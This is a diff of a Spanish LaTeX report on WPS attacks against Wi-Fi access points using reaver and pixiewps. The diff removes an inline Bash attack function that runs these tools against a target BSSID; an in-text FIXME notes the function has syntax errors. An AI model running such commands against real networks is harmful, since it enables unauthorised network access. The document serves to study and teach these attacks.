@@ -1142,74 +1142,9 @@ Reaver se planteó como un ataque sólido y muy conveniente contra WPS. Se ejecuta
 Como siempre, se activará el modo monitor de la tarjeta inalámbrica y se empezará a capturar el tráfico en el aire con \textit{airodump-ng} para obtener los \textit{beacons} de información del punto de accesos, y así comprobar que el dicho punto esta utilizando WPS.
 Una vez detectado WPS en el punto de acceso se prueba mediante la herramienta \textit{reaver} si el punto es vulnerable. Ésta, realizará fuerza bruta sobre el punto de acceso, enviando distintos PIN hasta encontrar el que le devuelva la credencial de la red con cifrado WPA2.
 
-\begin{lstlisting}        [label=prueba5,caption=Ataque Reaver]
-Atacarreaver(){
-    TARJETA_SELECCIONADA=`cat $ARCHIVO_TARJETA_SELECCIONADA` 
-    TARJETA_MODO_MONITOR=`cat $ARCHIVO_TARJETA_MONITOR` 
-    ifconfig $TARJETA_SELECCIONADA up &> /dev/null
-    ATAQUE_DETENIDO="NO"
-    (`sudo python "$RUTA_INFORME/SECWPA1.py" $BSSID "$ESSID" $CANAL $TARJETA_MODO_MONITOR`)
-    echo "ATACANDO BSSID $BSSID EN CANAL $CANAL" > $ARCHIVO_STATUSBAR
-    X1="reaver_pixie -F -G -i $TARJETA_MODO_MONITOR -b $BSSID -c $CANAL -a -n -vv -D"
-    reaver_pixie -F -G -i $TARJETA_MODO_MONITOR -b $BSSID -c $CANAL -a -n -vv -D \
-                 > $ARCHIVO_TXT_ATAQUE 2> /dev/null
-    if ! EsperarAcabarReaver ; then
-        if [ $AUTOMATICO = 0 ]; then
-            if [ $vez -eq 1 ]; then
-                #Infome Latex SUBSWPA1-Template.tex
-                X2="NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $BSSID"
-                X3="..LOGS\TXT_ATASQUE"
-                X4="FIN-Template"
-                (`sudo python "$RUTA_INFORME/SUBSWPA1.py" "$X1" "$X2" "$X3" "$X4"`)
-            else
-            fi
-        fi
-    
-        if [ $vez -eq 1 ]; then 
-            AgregarBssidDatabases 1
-            ATAQUE_ACABADO="SI"
-            if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosEscaneoAirodump; fi
-                echo "1" > $ARCHIVO_LOG
-                return 1 
-            fi
-        fi
-        if [ $ATAQUE_DETENIDO = "SI" ]; then 
-            return; 
-        fi
-        if ! ExtraerDatosReaver ; then
-            if [ $AUTOMATICO = 0 ]; then 
-                yad --image "error" --title "ATAQUE FALLIDO" 
-                    --button=gtk-ok:0 --text "<b>ERROR</b>: $MENSAJE_ERROR DE $BSSID" 
-                    --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png ;
-            fi
-            echo "$MENSAJE_ERROR DE $BSSID" > $ARCHIVO_STATUSBAR
-            echo "1" > $ARCHIVO_LOG
-            AgregarBssidDatabases 1
-            ATAQUE_ACABADO="SI"
-            if [ $ACTUALIZAR_SCAN = "SI" ]; then 
-                ProcesarDatosEscaneoAirodump; 
-            fi
-            #Infome Latex SECWPA1-Template.tex
-            X2="NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $BSSID"
-            X3="..LOGS\TXT_ATAQUE"
-            X4="FIN-Template"
-            (`sudo python "$RUTA_INFORME/SUBSWPA1.py" "$X1" "$X2" "$X3" "$X4"`)
-            echo "1" > $ARCHIVO_LOG
-            return
-        fi
-        echo "PROBANDO CON PIXIEWPS 1.0 by wiire" > $ARCHIVO_STATUSBAR
-        #Infome Latex SECWPA1-Template.tex
-        X2="Se ha obtenido la informaciÛn requerida"
-        X3="pixiewps -e $PKe -r $PKr -s $EHash1 -z $EHash2 -a $AuthKey -n $Enrollee"
-        X4="PIXIEWPS"
-        (`sudo python "$RUTA_INFORME/SUBSWPA1.py" "$X1" "$X2" "$X3" "$X4"`)
-        pixiewps -e $PKe -r $PKr -s $EHash1 -z $EHash2 -a $AuthKey -n $Enrollee &>> $ARCHIVO_TXT_ATAQUE
-        AnalizarLogPixiewps
-        echo "1" > $ARCHIVO_LOG
-}
-\end{lstlisting}
-
-\FIXME{El archivo de arriba tiene errores sintácticos, else vacío, if sin cerrar.}
+\lstinputlisting[language=Bash,
+                 label=prueba5,
+                 caption=Ataque Reaver] {Atacarreaver().txt}
 
 \paragraph{Pixiewps:}
 Este ataque \textit{Pixiewps} es también conocido como \textit{polvo mágico}. Lo primero que hará es comprobar si el router al que se le realiza el ataque es vulnerable. Si así lo fuera, se podrá obtener la clave en segundos. Continuando los pasos de los ataques anteriores y utilizando la tarjeta en modo monitor y escaneando el tráfico, se atacará a una de las redes disponibles que disponga de WPS activado. Primero utilizaremos el comando \textit{reaver} para recoger la PKE (clave pública de la persona inscrita), PKR (clave pública del registrador),e-hash 1 (hash  de la primera mitad del PIN WPS, fuerza bruta) y E-2 de hash (hash  de la segunda mitad del PIN WPS, fuerza bruta), E-nonce/ R-nonce y la authkey. Una vez se obtenga toda la información, se podrá aplicar pixiewps, para reducir tiempos.
